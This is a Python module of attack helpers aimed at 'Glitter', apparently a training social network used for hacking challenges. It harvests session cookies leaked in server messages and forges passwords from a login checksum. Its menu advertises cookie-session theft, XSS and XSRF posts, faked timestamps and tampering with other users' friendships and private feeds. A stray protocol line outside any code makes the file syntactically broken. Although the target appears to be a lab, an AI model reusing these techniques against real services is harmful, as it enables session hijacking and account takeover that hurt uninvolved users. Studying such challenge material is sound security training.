import datetime
import socket
import time
import hashlib
import requests
import ast
import json
from pygments import highlight
from pygments.lexers import JsonLexer
from pygments.formatters import TerminalFormatter

ROOT_URL = "http://cyber.glitter.org.il"
GLITTER_ADDRESS = ("54.187.16.171", 1336)
COLORS = ["black", "blue", "green", "red", "yellow", "orange", "purple", "pink", "brown", "white"]
SEARCH_MODES = ["SIMPLE", "ID", "WILDCARD"]
A_ASCII = 65 
COLORS_OUTPUT = {
    "red" : "\033[31m",
    "green" : "\033[32m",
    "yellow" : "\033[33m",
    "blue" : "\033[34m",
    "purple" : "\033[35m",
    "cyan" : "\033[36m",
    "white" : "\033[37m",
    "reset" : "\033[0m"
}
protocol_messages = {
    "login": """100#{gli&&er}{"user_name":"%s","password":"%s","enable_push_notifications":true}##""",
    "checksum": """110#{gli&&er}%d##""",
    "like": """710#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##""",
    "unlike": """720#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##""",
    "wow": """750#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##""",
    "post": """550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"im5","background_color":"%s","date":"%s","content":"%s","font_color":"%s","id":-1}##""",
    "comment": """650#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1,"content":"%s","date":"%s"}##""",
    "friendship-request": """440#{gli&&er}%d##""",
    "friend-request": """410#{gli&&er}[%d, %d]##""",
    "friend-accept": """420#{gli&&er}[%d, %d]##""",
    "friend-decline": """430#{gli&&er}[%d, %d]##""",
    "friendship-status": """400#{gli&&er}[%d, %d]##""",
    "search": """300#{gli&&er}{"search_type":"%s","search_entry":"%s"}##""",
    "profile": """500#{gli&&er}{"feed_owner_id":%d,"end_date":"2023-06-16T16:15:24.325Z","glit_count":5}##""",
    "settings": """350#{gli&&er}{"screen_name":"doesntMatter","avatar":"im5","description":"doesntMatter","privacy":"Private","id":%d,"user_name":"doesntMatter","password":"doesntMatter","gender":"Female","mail":"doesntMatter@gmail.com"}##""",
    "logout": "200#{gli&&er}%d##",
}
410#{gli&&er}[7517, 2134]##

def collect_cookies(cookie_msg: str, cookie_list: list) -> None:
    """
    This function collects all cookies that been Leaking through the code.
    :parm cookie_msg: the full cookie msg
    :parm cookie_list: the cookies list
    :type cookie_msg: str
    :type cookie_list: list
    """
    if "416#Glance request was sent by the user. Initiator: " in cookie_msg:
        cookie = cookie_msg[len("""416#Glance request was sent by the user. Initiator: """):cookie_msg.find("""{gli&&er}""")]
        cookie_list.append({"Cookie": cookie})

    if "506#Another user loaded your feed:" in cookie_msg:
        min_cookie_msg = cookie_msg[cookie_msg.rfind("""506#Another user loaded your feed: [sessionId: """):cookie_msg.find(",")]
        cookie = min_cookie_msg[len("506#Another user loaded your feed: [sessionId: "):]
        cookie_list.append({"Cookie": cookie})


def recvall(sock: socket.socket, cookie_list: list) -> None:
    """
    This function recv unlimted size of data into the buffer
    :parm sock: the socket
    :type sock: socket.socket
    """
    BUFF_SIZE = 4096 * 4 # 4 KiB times 4
    data = ''
    while True:
        part = sock.recv(BUFF_SIZE).decode()
        if "Glance request was sent by the user." in part or "Glance request approved by user" in part or "The user with the given id searched you" in part or "Another user loaded your feed" in part:
            print("{}[update] {}{}".format(COLORS_OUTPUT["yellow"], part, COLORS_OUTPUT["reset"]))
            collect_cookies(part, cookie_list)
            continue

        else:
            data += part

        if data[-1] == '\n':
            break

    return data


def send_message(sock: socket.socket, message: str, cookie_list: list) -> str:
    """
    This function send message and receive response from server.
    :param sock: socket object
    :type sock: socket.socket
    :param message: message to send
    :type message: str
    :return: response from server
    :rtype: str
    """
    sock.sendall(message.encode())
    response = recvall(sock, cookie_list)
    return response


def ascii_checksum(string: str) -> int:
    """
    This function creates the ascii checksum in the login process
    :parm string: the string to do an ascii checksum
    :type string: str
    :return: the ascii checksum value
    :rtype: int
    """
    return sum(list(map(ord, string)))


def load_glitter_responses(msg: str, spliter: str) -> dict:
    """
    This function loads the glitter responses from json format into a dict.
    :parm msg: the message to load the responses from
    :type msg: str
    :parm spliter: The spliter to split the responses.
    :type spliter: str
    :return: the glitter responses
    :rtype: dict
    """
    glits_info = msg[len(spliter):-3]
    glits_info = json.loads(glits_info)
    return glits_info


def login(sock: socket.socket, username: str, password: str, cookie_list: list) -> None:
    """
    This function logs into the glitter server.
    :parm sock: The socket to send the login request to.
    :type sock: socket.socket
    :parm password: the password
    :type username: str
    :type password: str
    """
    checksum = ascii_checksum(username + password)

    msg = protocol_messages["login"] % (username, password)
    data = send_message(sock, msg, cookie_list)

    if data.startswith("105"):
        data = send_message(sock, protocol_messages["checksum"] % checksum, cookie_list)
        if (data.startswith("115#Authentication approved")):
            print("{}[+] {} logged in!{}\n".format(COLORS_OUTPUT["green"], username, COLORS_OUTPUT["reset"]))
            my_info_dict = load_glitter_responses(data, "115#Authentication approved{gli&&er}")

    else:
        print(f"[-] your username: {username} or password: {password} not found!")
        sock.close()
        exit(0)

    return my_info_dict


def web_login(username: str, password: str) -> dict:
    """
    This function logs in the glitter website.
    :parm username: the username
    :parm password: the password
    :type username: str
    :type password: str
    :return: website data about my login
    :retype: str
    """
    login_url = f"{ROOT_URL}/user/"
    response = requests.post(login_url, json=[username, password])
    if response.status_code != 200:
        print(f"[-] your username: {username} or password: {password} not found!")
        return None

    else:
        print("{}[+] logged in website!{}".format(COLORS_OUTPUT["cyan"], COLORS_OUTPUT["reset"]))

    data = ast.literal_eval(response.text)
    print(data)
    return data


def web_get_request(url: str, cookie: str) -> dict:
    """
    This function gets the data from the get requests and convert it into a dict
    :parm url: the requested url
    :parm cookie: the cookie for the requests
    :type url: str
    :type cookie: str
    :return: dict with all the info
    :rtype: dict
    """
    response = requests.get(url, headers={"Cookie": "sparkle={}".format(cookie)})
    data = ast.literal_eval(response.text)
    return data


def time_parser(time_str: str, op: int) -> str:
    """
    This function parses the time string.
    :parm time_str: The time string to parse.
    :parm op: The option to do on the time string.
    :type time_str: str
    :type op: int
    :return: The parsed time string.
    :rtype: str
    """
    if not op: # option 0 is for spoof time & date
        time_str = time_str.split(" ")
        time_str = """{}T{}Z""".format(time_str[0], time_str[1])

    else: # option 1 is for current time & date
        # get current time and date from time moudle
        time_str = time.strftime("%Y-%m-%dT%H:%M:%SZ")

    return time_str


def convert_id_str(id: int) -> str:
    """
    This function converts the id to an ascii letters by index.
    :parm id: The id string to convert.
    :type id: int
    :return: The converted id.
    :rtype: str
    """
    return "".join(list(map(lambda x: chr(int(x) + A_ASCII), str(id))))
    


def make_password(checksum: str, username: str) -> str:
    """
    This function clears the checksum and makes a password
    :parm checksum: the checksum
    :type checksum: str
    :parm username: the username
    :type username: str
    :return: the password
    :rtype: str
    """
    abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    username_checksum = ascii_checksum(username)
    password_checksum = checksum - username_checksum
    password = ""
    for letter in abc:
        p1_password = letter * (password_checksum // ord(letter))
        p2_password = chr(password_checksum - ascii_checksum(p1_password))
        password = p1_password + p2_password
        if password.isalnum():
            break

    return password
    

def logout_website(id: int) -> None:
    """
    This function logs out from the website
    :parm id: the id of the user
    :type id: int
    """
    logout_url = f"{ROOT_URL}/user/{id}"
    requests.delete(logout_url)
    print("{}[+] {} logged out from website!{}".format(COLORS_OUTPUT["green"], id, COLORS_OUTPUT["reset"]))


def logout(sock: socket.socket, id: int, cookie_list: list) -> None:
    """
    This function logs out of the glitter server.
    :parm sock: The socket to send the logout request to.
    :type sock: socket.socket
    :parm id: The user id of the user to log out.
    :type id: int
    """
    msg = protocol_messages["logout"] % id
    data = send_message(sock, msg, cookie_list)
    if """205#User logout approved{gli&&er}##""" in data:
        print("{}[+] {} logged out from app!{}\n".format(COLORS_OUTPUT["purple"], id, COLORS_OUTPUT["reset"]))


def print_manual():
    """
    This function prints the manual for the program.
    """
    print("""\npick an option:

    {}[300] [a] send_glit_post func: This function sends a glit post to any user that is private using search #300 search!{}

    {}[350] [a] get_username func: gets username by screen name.{}

    {}[710] [a] send_like func: sends a like from my user to my post unlimited times.{}

    {}[550] [a] send_glit_xss func: sends a glit from me to my glitter post and adds an image with xss.
          [b] send_time_glit func: sends a glit from me to my glitter post and adds a fake time.{}

    {}[650] [a] change_comment_time_glit func: changes the comment time of my glitter post - can change it only for the past.\nand you can comment under any private account posts.{}
    
    {}[440] [a] search_friendship_status func: views fresh friend requests in anybodys feed.{}
    
    {}[420] [a] aprove_decline_glance_request func: accepet or decline any user friend requests!{}

    {}[410] [a] steal_cookie_session func: checks if user loged in glitter -> if true, youll get theire cookie session.{}

    {}[430] [a] aprove_decline_glance_request func: accepet or decline any user friend requests!
          [b] cancel_friendship func: cancel out friendship from any user to user.{}

    {}[750] [a] send_wow func:  send a special kind of like to a post unlimited times.{}

    {}[Cookie] [a] print_cookies func: prints all cookies that have been collected in the code.{}

    {}[challenge] [a] get_password func: uses http traffic and more and gets a password fronm screen name.
                    [b] get_cookie_session func: gets any user cookie session
                    [c] xsrf_send func:  xsrf challenge.
                    [d] view_history_user func: view all search history of a user.{}""".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"], 
                                                                                                                                            COLORS_OUTPUT["purple"], COLORS_OUTPUT["reset"], 
                                                                                                                                            COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"], 
                                                                                                                                            COLORS_OUTPUT["blue"], COLORS_OUTPUT["reset"], 
                                                                                                                                            COLORS_OUTPUT["yellow"], COLORS_OUTPUT["reset"], 
                                                                                                                                            COLORS_OUTPUT["cyan"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["purple"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["blue"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["yellow"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["cyan"], COLORS_OUTPUT["reset"],
                                                                                                                                            COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
           